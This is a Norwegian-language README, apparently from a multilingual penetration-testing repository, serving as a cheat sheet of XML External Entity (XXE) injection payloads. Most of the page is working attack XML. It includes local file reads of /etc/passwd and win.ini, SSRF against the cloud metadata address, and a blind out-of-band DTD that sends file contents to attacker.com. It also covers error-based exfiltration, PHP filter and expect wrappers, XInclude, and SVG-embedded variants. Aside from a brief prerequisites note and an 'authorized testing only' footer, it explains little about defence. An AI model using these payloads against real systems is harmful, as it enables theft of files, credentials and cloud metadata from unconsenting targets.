# 📄 XXE – XML External Entity Injection

<!-- language-home-navigation -->
[🏠 Norsk startside](../../README.nb.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)

```
  ██╗  ██╗██╗  ██╗███████╗
  ╚██╗██╔╝╚██╗██╔╝██╔════╝
   ╚███╔╝  ╚███╔╝ █████╗  
   ██╔██╗  ██╔██╗ ██╔══╝  
  ██╔╝ ██╗██╔╝ ██╗███████╗
  ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
   Injeksjon av eksterne XML-entiteter
```

> **Begreper og forutsetninger:** En entitet er en XML-referanse, og en DTD definerer blant annet entiteter. XXE krever at parser og konfigurasjon tillater relevant ekstern behandling. XInclude er en egen mekanisme og må være aktivert separat. Deklarasjonen UTF-16 konverterer ikke bytekodingen alene, og PHP-wrappere som expect krever bestemt miljø og støtte. OOB-/feilbaserte eksempler avhenger også av utgående tilgang og hvordan innholdet kan representeres. Koden er bevart; se [PortSwiggers XXE-veiledning](https://portswigger.net/web-security/xxe).

---

## 🎯 Hva er XXE

**XXE** utnytter XML-parsere som behandler referanser til eksterne entiteter, og kan gi fillesing, SSRF og i noen tilfeller kodekjøring.

---

## 💉 Grunnleggende payloads

### Les lokale filer
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```

### Windows-filer
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>
```

### SSRF via XXE
```xml
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://internal-server:8080/">
]>
<root>&xxe;</root>
```

---

## 🔒 Blind XXE (out-of-band)

### Ekstern DTD
```xml
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>test</root>
```

**evil.dtd på angriperens server:**
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker.com/?data=%file;'>">
%eval;
%exfil;
```

### Feilbasert eksfiltrering
```xml
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
  %eval;
  %error;
]>
```

---

## 🛡️ Omgåelsesteknikker

### Koding
```xml
<!-- UTF-16 -->
<?xml version="1.0" encoding="UTF-16"?>

<!-- Pakket inn i Base64 -->
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
```

### Protokollvarianter
```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY xxe SYSTEM "expect://id">
<!ENTITY xxe SYSTEM "data://text/plain,test">
```

### XInclude
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

### XXE i SVG
```xml
<?xml version="1.0"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <text x="0" y="20">&xxe;</text>
</svg>
```

---

## 📊 Hurtigreferanse

| Payloadtype | Bruksområde |
|--------------|----------|
| Fillesing | `SYSTEM "file:///etc/passwd"` |
| SSRF | `SYSTEM "http://internal/"` |
| Blind (OOB) | Ekstern DTD og eksfiltrering |
| Feilbasert | Fremprovoser feil med data |

### Vanlige sårbare endepunkter
```
- SOAP-API-er
- Opplasting av XML-filer
- SVG-behandling
- Dokumentparsere (DOCX, XLSX)
- RSS-/Atom-strømmer
```

---

## 📚 Ressurser

- [PortSwigger XXE](https://portswigger.net/web-security/xxe)
- [PayloadsAllTheThings XXE](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection)

---

<p align="center">
  <b>📄 Undersøk XML-parsere!</b><br>
  <i>Bare til autorisert testing!</i>
</p>
